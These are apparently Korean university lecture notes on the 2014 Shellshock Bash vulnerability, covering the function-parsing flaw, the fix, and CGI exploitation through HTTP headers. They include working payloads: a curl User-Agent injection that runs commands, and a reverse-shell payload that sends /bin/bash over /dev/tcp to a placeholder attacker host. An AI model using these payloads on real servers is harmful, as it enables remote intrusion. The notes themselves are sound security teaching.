Shellshock

환경 변수를 통해 전달된 함수 정의를 Bash가 잘못 파싱하여, 뒤에 붙은 임의의 명령까지 실행해 버리는 취약점. 데이터가 코드로 바뀌는 순간을 추적한다.

2014.09.24 공개 대상: Bash 공격 벡터: Environment Variable 실전: CGI · Web Incheon National Univ. · CCLAB
01

Shellshock 개요Introduction

한 줄 정의 slide 2

Shellshock은 2014년 9월 24일에 공개된 Bash 셸의 취약점이다. Bash가 환경 변수에 담긴 함수 정의를 처리하는 방식의 결함을 이용하며, 특히 CGI(Common Gateway Interface)를 사용하는 웹 서버 환경에서 원격 명령 실행으로 이어질 수 있다.

  • 공개일 — September 24, 2014
  • 취약 대상 — Bash (Bourne-Again Shell)
  • 관련 개념 — 환경 변수(Environment variable) / CGI 와 Web
왜 위험한가

공격자가 직접 셸 접근 권한이 없어도, 웹 요청 헤더 같은 "데이터"만 조작하면 서버에서 명령이 실행된다. 이 문서는 "함수 정의 → 환경 변수 전달"이라는 정상 기능이 어떻게 공격으로 뒤집히는지 순서대로 따라간다.

02

셸에서 함수 정의Defining Functions in Shell

함수의 정의 · 조회 · 삭제 slide 3

Bash에서는 이름() { 명령; } 형태로 함수를 만든다. 정의된 함수는 declare -f로 내용을 확인할 수 있고, unset -f로 삭제한다.

  • foo() { echo hello; } — 함수 foo 정의
  • declare -f foo — 함수 본문 출력
  • unset -f foo — 함수 삭제 (이후 조회 시 아무것도 안 나옴)
$ foo() { echo hello; }
$ foo
hello
$ declare -f foo
foo ()
{
    echo hello
}
$ unset -f foo
$ declare -f foo
(nothing)
03

자식 프로세스로 함수 전달Passing Function to Child Process

방법 A — 함수를 명시적으로 export slide 4

export -f foo를 쓰면 함수 정의가 자식 셸에게 그대로 전달된다. 새 /bin/bash를 띄운 뒤 declare -f foo를 해보면 부모의 함수가 그대로 살아있다.

정상 동작

export -f는 "함수를 함수로" 전달하겠다는 의도가 명시적이다. 여기까지는 문제가 없다.

$ foo() { echo hello; }
$ export -f foo   ← 자식 셸로 명시적 전달
$ declare -f foo
foo () { echo hello }

# 자식 bash 셸 시작
$ /bin/bash
Child:$ declare -f foo
foo () { echo hello }

방법 B — 환경 변수(문자열)로 전달 : patched vs vulnerable slide 5

이번엔 함수가 아니라 문자열 '() { echo hello; }'를 일반 환경 변수 foo에 담아 export foo 한다. 이때 자식 셸이 이 문자열을 어떻게 해석하느냐가 patched(정상) 과 vulnerable(취약) 을 가른다.

■ patched bash — 문자열은 문자열로
$ foo='() { echo hello; }'
$ export foo
$ /bin/bash # patched
Child:$ declare -f foo
(함수 아님 → 비어있음)
Child:$ echo $foo
() { echo hello; }
Child:$ exit
결과

$foo는 문자열 그대로 출력되고, declare -f에는 안 잡힌다. → 데이터로 취급.

■ vulnerable bash — 문자열을 함수로 변환
$ foo='() { echo hello; }'
$ export foo
$ /bin/bash_shellshock # vuln
Child:$ declare -f foo
foo ()
{
    echo hello
}
Child:$ echo $foo
(비어있음)
Child:$ exit
결과

취약한 bash는 () { 로 시작하는 값을 보면 자동으로 함수로 만든다. → 데이터가 함수(코드)로 승격됨.

동일한 환경 변수를, patched는 데이터로 / vulnerable은 코드(함수)로 해석
04

Shellshock 취약점Shellshock Vulnerability

함수 정의 뒤에 명령을 붙이면? slide 6

핵심 트릭: 환경 변수 값을 '() { echo hello; }; echo extra' 로 만든다. 즉 함수 정의 뒤에 세미콜론으로 추가 명령(echo extra)을 붙인다.

취약점의 순간

취약한 bash로 자식 셸을 띄우는 순간, 함수 정의를 파싱하다가 뒤에 붙은 echo extra 까지 그대로 실행된다. 화면에 extra가 즉시 출력된다.

  • 정상 의도 — foo라는 함수만 만들어지길 기대
  • 실제 — 함수 생성 + 추가 명령 실행 (여기선 echo extra)
  • 이 "추가 명령" 자리에 임의의 명령을 넣으면 → 임의 코드 실행(RCE)
$ foo='() { echo hello; }; echo extra'
$ export foo
$ echo $foo
() { echo hello; }; echo extra   ← 추가 명령

# 취약한 bash로 자식 셸 시작
$ /bin/bash_shellshock
extra          ← ★ 자동 실행되어 버림!
Child:$ echo $foo
(비어있음)
Child:$ declare -f foo
foo ()
{
    echo hello
}
함수 정의부만 처리하고 멈춰야 하는데, 뒤의 추가 명령부까지 실행되는 것이 Shellshock
05

소스 코드의 실수Mistake in the Source Code

Line A vs Line B slide 7

bash 소스에서 환경 변수 값이 "함수 정의처럼 생겼는지"를 () { 패턴(STREQN("() {", string, 4))으로 검사한다. 문제는 그 뒤 처리 방식이다.

Line A: foo=() { echo "Hello World"; }; echo "extra";
Line B: foo () { echo "Hello World"; }; echo "extra";

진짜 원인: parse_and_execute() slide 7

취약한 코드는 함수 정의 문자열을 처리할 때 parse_and_execute() 를 호출한다. 이 함수는 이름 그대로 파싱(parse)만 하는 게 아니라 실행(execute)까지 한다.

  • 기대: 문자열을 파싱만 해서 함수로 등록
  • 실제: 문자열 전체를 실행 → 함수 뒤 명령까지 동작
결함의 본질

"함수 정의"라는 제한된 문법만 받아들여야 하는 자리에, 임의의 셸 스크립트를 실행하는 함수를 써버린 것이 근본 실수다.

void initialize_shell_variables (env, privmode)
{
  [...]
  for (string_index = 0;
       string = env[string_index++]; )
  {
    /* If exported function, define it now.
       Don't import functions from the
       environment in privileged mode. */
    if (privmode == 0 &&
        read_but_dont_execute == 0 &&
        STREQN ("() {", string, 4))
    {
      // ★ Shellshock 취약점이 여기 있음
      parse_and_execute (temp_string, name,
              SEVAL_NONINT|SEVAL_NOHIST);
    }
  }
}
06

교훈: Data ⇒ CodeLessons Learned

위반된 보안 원칙 slide 8

Shellshock가 위반한 보안 원칙은 한 문장으로 요약된다: Data ⇒ Code?

외부에서 들어온 데이터(환경 변수 값)가, 적절한 경계 검증 없이 코드(실행되는 명령)로 바뀌었다. 신뢰할 수 없는 입력을 실행 가능한 것으로 승격시키는 것은 대표적인 취약점 패턴이다.

일반 원칙

입력(데이터)과 실행(코드)의 경계를 명확히 분리하라. 데이터는 끝까지 데이터로만 취급되어야 한다.

신뢰 불가 데이터가 코드로 승격 = 취약점
07

Bash의 문제 해결 방법How Bash Fixes the Problem

수정 ① 환경 변수는 함수로 변환하지 않는다 slide 9

패치된 bash는 foo='() { ... }' 처럼 일반 환경 변수에 담긴 함수 형태 문자열을 더 이상 함수로 자동 변환하지 않는다.

  • declare -f foo → 아무것도 없음 (함수 아님)
  • echo $foo → 문자열 그대로 출력
효과

임의의 환경 변수를 통한 자동 함수 변환 경로가 차단된다.

$ foo='() { echo hello; }'
$ export foo
$ declare -f foo
$   ← 함수 아님

# patched bash 자식 셸
$ /bin/bash
Child:$ declare -f foo
Child:$ echo $foo
() { echo hello; }

수정 ② 함수 전달은 전용 이름(BASH_FUNC_...) 으로 slide 10

그렇다면 진짜 함수는 어떻게 전달하나? export -f foo 로 함수를 export 하면, 내부적으로 일반 변수와 구분되는 특별한 이름을 붙여 환경 변수로 인코딩한다.

$ foo() { echo hello; }
$ export -f foo
$ /bin/bash
Child:$ declare -f foo
foo() { echo hello }
Child:$ echo $foo
(비어있음 — 일반 변수 foo 아님)
Child:$ strings /proc/$$/environ | grep foo
BASH_FUNC_foo%%=() { echo hello
핵심

BASH_FUNC_foo%% 라는 전용 접두/접미 이름으로 저장되므로, 일반 환경 변수 이름과 절대 겹치지 않는다. → 공격자가 임의 변수명으로 함수 변환을 유도할 수 없다.

함수는 전용 이름으로 인코딩되어 전달되고, 자식에서 다시 함수로 복원
08

공격 성립 조건Conditions

두 가지 조건이 모두 필요 slide 11

  • 조건 1 — Run Bash : 어떤 경로로든 (취약한) Bash가 실행되어야 한다.
  • 조건 2 — Take input from environment variables : 그 Bash가 환경 변수로부터 입력을 받아야 한다.
핵심 연결

두 조건이 만나면, 함수 정의를 담은 환경 변수가 환경 파싱 로직(environment parsing logic)을 건드리고, 그것이 Shellshock로 이어진다. 다음 장의 CGI가 바로 이 두 조건을 동시에 만족시키는 대표 사례다.

Bash 실행 → 환경 변수 파싱 로직 발동 → Shellshock
09

CGI에 대한 Shellshock 공격Shellshock Attack on CGI

CGI는 어떻게 동작하는가 slide 12

CGI(Common Gateway Interface)는 웹 서버가 동적 페이지를 제공하기 위한 인터페이스다. 클라이언트의 HTTP 요청이 오면, 웹 서버(Apache)가 fork()로 CGI 프로그램(예: bash 스크립트)을 실행하고 결과를 돌려준다.

HTTP 요청 → Apache가 fork()로 bash CGI 실행 (입력은 환경 변수로 전달)

HTTP 요청 헤더 → 환경 변수 (공격 채널) slide 13

CGI 프로그램은 요청 정보를 환경 변수로 받는다. 특히 HTTP 요청 헤더들이 HTTP_* 형태의 환경 변수로 그대로 들어온다.

  • User-Agent 헤더 → HTTP_USER_AGENT
  • Host 헤더 → HTTP_HOST
  • 즉, 공격자가 헤더 값을 통제 = 환경 변수 값을 통제
channel

User-Agent 같은 헤더가 곧 공격 채널이다. 조건 2("환경 변수로 입력")가 자동으로 충족된다.

■ 취약한 CGI 프로그램 예시
#!/bin/bash_shellshock
echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ
→ 이 스크립트는 자신에게 넘어온 환경 변수를 그대로 출력하므로, 헤더가 환경 변수로 변환됨을 눈으로 확인할 수 있다.

명령줄에서 확인: curl -A slide 14

curl -A 옵션은 User-Agent 헤더를 지정한다. 임의 값 %%%%mydata%%%% 를 넣어 요청하면, 서버 응답의 환경 변수 목록에 HTTP_USER_AGENT=%%%%mydata%%%% 로 그대로 나타난다.

확인된 사실

공격자가 넣은 헤더 값이 서버 측 bash의 환경 변수가 된다는 것이 실증됨.

$ curl -A "%%%%mydata%%%%" -v \
     http://localhost/cgi-bin/getenv.cgi
*  GET /cgi-bin/getenv.cgi HTTP/1.1
*  Host: localhost
*  User-Agent: %%%%mydata%%%%
< HTTP/1.1 200 OK
< Content-Type: text/plain
****** Environment Variables ******
HTTP HOST=localhost
HTTP USER AGENT=%%%%mydata%%%%
HTTP ACCEPT=*/*
PATH=/usr/local/sbin:...:/bin
SERVER SOFTWARE=Apache/2.4.18 (Ubuntu)
REMOTE ADDR=127.0.0.1

공격 성립: 헤더에 함수+명령 주입 slide 15

이제 User-Agent 값에 Shellshock 페이로드를 넣는다. () { echo hello;} 로 함수 정의 트리거를 만들고, 세미콜론 뒤에 실제 실행할 명령을 붙인다.

$ curl -A "() { echo hello;}; \
     echo Content_type: text/plain; echo; \
     /bin/ls -l" \
     http://localhost/cgi-bin/getenv.cgi
  • () { echo hello;} — 취약한 bash가 함수 파싱을 시작하게 만드는 트리거
  • echo Content_type: ...; echo; — HTTP 응답 형식을 맞추기 위한 헤더/빈 줄 출력
  • /bin/ls -l — 서버에서 실제로 실행되는 임의 명령

Demo & 실행 권한 slide 16

같은 방식으로 User-Agent(-A) 뿐 아니라 Referer(-e) 헤더 필드로도 공격이 가능하다. 데모에서는 이 취약점으로 /tmp 에 파일 xyz 를 생성한다.

실행 주체

현재 웹 서버 프로세스의 사용자 → user id: www-data. 즉 주입한 명령은 www-data 권한으로 실행된다. (권한 상승은 별개 과제)

리버스 셸 공격Reverse Shell via Shellshock

remote shell vs. reverse shell slide 18

Remote shell (ssh, rsh 등)은 공격자가 피해자에게 접속해 들어간다. 하지만 방화벽/NAT로 피해자에 직접 접속이 막힌 경우가 많다.

Reverse shell은 반대로, 피해자(서버)가 공격자에게 먼저 연결을 맺는다. 셸 프로그램은 피해자 위에서 실행되지만, 그 입출력이 공격자 쪽으로 향한다.

핵심 질문

서버에서 /bin/bash 를 실행하되, 그 Input/Output을 공격자 머신으로 돌리는 것 — 이것이 리버스 셸의 요체다.

셸은 피해자에서 돌지만, 입력/출력은 공격자에게 연결

표준 I/O를 TCP로 리다이렉트 slide 20

Bash는 /dev/tcp/HOST/PORT 라는 특수 경로로 TCP 연결을 열 수 있다. 여기에 대화형 셸(-i)의 표준 입출력을 모두 연결하면 리버스 셸이 된다.

/bin/bash -i
/bin/bash -i >/dev/tcp/10.9.0.1/9090
/bin/bash -i >/dev/tcp/10.0.2.6/9090 0<&1 2>&1
기호의미
-iinteractive (대화형) 셸로 실행
0stdin (표준 입력)
1stdout (표준 출력)
2stderr (표준 에러)
&1fd 1이 가리키는 대상(= TCP 소켓) 그 자체
해석

>/dev/tcp/.../9090 로 stdout(1)을 TCP 소켓에 연결하고, 0<&1 로 stdin(0)을, 2>&1 로 stderr(2)를 모두 같은 소켓(&1)에 붙인다. → 0·1·2 전부 네트워크로.

최종 페이로드: Shellshock + Reverse Shell slide 21

지금까지의 조각을 합친다. CGI로 향하는 HTTP 요청의 User-Agent에 함수 트리거 + 리버스 셸 명령을 넣는다.

$ curl -A "() { echo hello;}; \
     echo Content_type: text/plain; echo; \
     /bin/bash -i >/dev/tcp/[attacker]/9090 0<&1 2>&1" \
     http://[victim]/cgi-bin/vul.cgi
동작 요약

① 공격자는 미리 9090 포트에서 리스닝 → ② victim의 취약한 CGI(bash)가 User-Agent를 파싱하며 리버스 셸 명령 실행 → ③ victim이 attacker로 연결을 맺고, 공격자는 www-data 권한의 대화형 셸을 손에 넣는다.

한눈에 정리

01 · 본질

Data ⇒ Code

환경 변수(데이터)가 검증 없이 실행되는 명령(코드)으로 승격되는 것이 근본 결함.

() { ... }; cmd

parse_and_execute()

파싱만 해야 할 자리에서 실행까지 수행 → 뒤의 임의 명령이 동작.

Bash + Env Input

취약 Bash 실행 & 환경 변수로 입력 수신, 두 조건이 동시에 필요.

05 · 실전 벡터

CGI · HTTP 헤더

User-Agent / Referer 등 헤더가 HTTP_* 환경 변수로 전달 = 원격 공격 채널.

patched vs vulnerable 최종 비교

항목Patched BashVulnerable Bash
